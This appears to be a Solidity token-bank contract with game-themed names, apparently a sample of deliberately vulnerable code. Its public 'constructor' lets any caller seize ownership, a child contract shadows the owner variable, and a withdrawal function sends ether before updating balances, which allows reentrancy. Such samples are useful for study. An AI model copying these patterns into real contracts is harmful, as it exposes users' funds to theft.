// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address newDungeonmaster;
    address guildLeader = msg.sender;

    function changeDungeonmaster(address addr)
    public
    onlyGuildleader
    {
        newDungeonmaster = addr;
    }

    function confirmRealmlord()
    public
    {
        if(msg.sender==newDungeonmaster)
        {
            guildLeader=newDungeonmaster;
        }
    }

    modifier onlyGuildleader
    {
        if(guildLeader == msg.sender)_;
    }
}

contract RealmCoin is Ownable
{
    address guildLeader = msg.sender;
    function ClaimlootRealmcoin(address questToken, uint256 amount,address to)
    public
    onlyGuildleader
    {
        questToken.call(bytes4(sha3("transfer(address,uint256)")),to,amount);
    }
}

contract QuesttokenGoldbank is RealmCoin
{
    uint public MinSaveprize;
    mapping (address => uint) public Holders;

     ///Constructor
    function initRealmcoinQuestbank()
    public
    {
        guildLeader = msg.sender;
        MinSaveprize = 1 ether;
    }

    function()
    payable
    {
        StashItems();
    }

    function StashItems()
    payable
    {
        if(msg.value>MinSaveprize)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawGoldtokenToHolder(address _to,address _goldtoken,uint _amount)
    public
    onlyGuildleader
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            ClaimlootRealmcoin(_goldtoken,_amount,_to);
        }
    }

    function CollecttreasureToHolder(address _addr, uint _wei)
    public
    onlyGuildleader
    payable
    {
        if(Holders[_addr]>0)
        {
            if(_addr.call.value(_wei)())
            {
                Holders[_addr]-=_wei;
            }
        }
    }
}